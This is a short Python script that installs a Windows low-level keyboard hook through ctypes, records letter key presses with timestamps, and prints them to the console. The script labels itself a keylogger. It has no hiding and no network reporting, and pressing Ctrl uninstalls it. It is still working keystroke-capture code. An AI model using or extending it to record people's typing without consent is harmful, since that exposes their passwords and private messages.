#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
import sys
import time
import ctypes
from ctypes.wintypes import MSG
from multiprocessing import Queue
from threading import Thread

from util import get_function_pointer

# Windows Hook: https://docs.microsoft.com/ko-kr/windows/win32/api/winuser/nf-winuser-setwindowshookexa?redirectedfrom=MSDN
WH_KEYBOARD_LL = 13

# https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644986(v=vs.85)?redirectedfrom=MSDN
WM_KEYDOWN = 0x0100

CTRL_CODE = 29

KEY_MAP = {
    16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't',
    21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p',
    30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g',
    35: 'h', 36: 'j', 37: 'k', 38: 'l',
    44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b',
    49: 'n', 50: 'm'
}


class KeyboardHook:
    def __init__(self, digest_fn=None):
        self.hooked = None
        self.queue = Queue()

        self.thread = None
        if digest_fn and callable(digest_fn):
            self.thread = Thread(target=digest_queue, args=(self.queue,), daemon=True)  # noqa: E501
            self.thread.start()

    def __del__(self):
        print('KeyboardHook.__del__')
        if self.thread:
            self.thread.join()

    def install_hook_procedure(self, pointer):
        module_handle = ctypes.windll.kernel32.GetModuleHandleW(None)
        self.hooked = ctypes.windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL,
                                                             pointer,
                                                             module_handle,
                                                             0)
        if not self.hooked:
            return False
        return True

    def uninstall_hook_procedure(self):
        if self.hooked is None:
            return
        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    def run(self):
        msg = MSG()
        ctypes.windll.user32.GetMessageA(ctypes.byref(msg), 0, 0, 0)

    def hook_procedure(self, nCode, wParam, lParam):
        if wParam is not WM_KEYDOWN:
            return ctypes.windll.user32.CallNextHookEx(self.hooked,
                                                       nCode,
                                                       wParam,
                                                       lParam)
        lparam = (lParam[0] >> 32)  # and 0xFFFF

        if CTRL_CODE == int(lparam):
            print("Ctrl pressed, call uninstallHook()")
            self.uninstall_hook_procedure()
            sys.exit(-1)

        try:
            hooked_key = KEY_MAP[int(lparam)]
        except KeyError:
            return ctypes.windll.user32.CallNextHookEx(self.hooked,
                                                       nCode,
                                                       wParam,
                                                       lParam)
        self.queue.put((int(time.time() * 1000), hooked_key))
        return ctypes.windll.user32.CallNextHookEx(self.hooked,
                                                   nCode,
                                                   wParam,
                                                   lParam)


def digest_queue(queue):
    while True:
        item = queue.get()
        print('item:', item)


if __name__ == "__main__":
    key_hook = KeyboardHook(digest_fn=digest_queue)
    pointer = get_function_pointer(key_hook.hook_procedure)
    if key_hook.install_hook_procedure(pointer):
        print("installed keyLogger")
    key_hook.run()
